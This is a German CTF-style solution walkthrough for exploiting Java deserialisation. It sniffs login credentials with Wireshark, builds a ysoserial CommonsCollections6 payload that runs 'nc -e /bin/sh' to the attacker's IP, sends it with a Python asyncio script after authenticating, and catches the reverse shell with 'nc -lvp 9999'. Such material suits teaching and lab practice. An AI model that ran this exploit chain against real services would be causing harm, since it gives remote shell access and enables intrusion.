# Lösungsweg

1. Mit Wireshark die Kommunikation auf Port 8124 anschauen. 
1. Username und Passwort aufschreiben, bei dem serialisierten Objekt kann man anhand des Anfangs `0xaced` erkennen, dass es sich um eine serialisiertes Java Objekt handelt.
1. Mit [ysoserial](https://github.com/frohoff/ysoserial) payloads für die verschiedenen Schwachstellen generieren und durchprobieren, welche funktionieren. Man würde wahrscheinlich mit den Payloads der ApacheCommonsCollection anfangen, weil die relativ häufig verwendet wird. ApacheCommonsCollection 1 bis 4 funktioniert nur unter alten Java-Versionen, daher würde man direkt ApacheCommonsCollection 5 bis 7 ausprobieren:  
`java --illegal-access=permit -jar ysoserial.jar CommonsCollections6 'nc -e /bin/sh 192.168.178.84 9999' > payload` (Achtung: Lokale IP-Adresse einsetzen!)
1. Um den Payload an den Server zu schicken, benötigt man ein Skript, das die Authentifizierung mit den mitgeschnittenen Logindaten durchführt.

```python
import asyncio

async def attack():
    reader, writer = await asyncio.open_connection(
        '127.0.0.1', 8124)

    print('Authenticating...')

    writer.write("johndoe@gmail.com\n".encode())
    await writer.drain()

    data = await reader.readline()
    print(f'Received: {data.decode()!r}')

    writer.write("u372hn8fj128j\n".encode())
    await writer.drain()

    data = await reader.readline()
    print(f'Received: {data.decode()!r}')

    print('Sending payload...')

    with open("payload", "rb") as payload:
        writer.write(payload.read())
        await writer.drain()

        data = await reader.readline()
        print(f'Received: {data.decode()!r}')


    print('Closing the connection...')
    writer.close()
    await writer.wait_closed()

asyncio.run(attack())
```

5. Um die Reverse-Shell zu empfangen, muss man noch auf dem eigenen Rechner den Listener starten: `nc -lvp 9999`
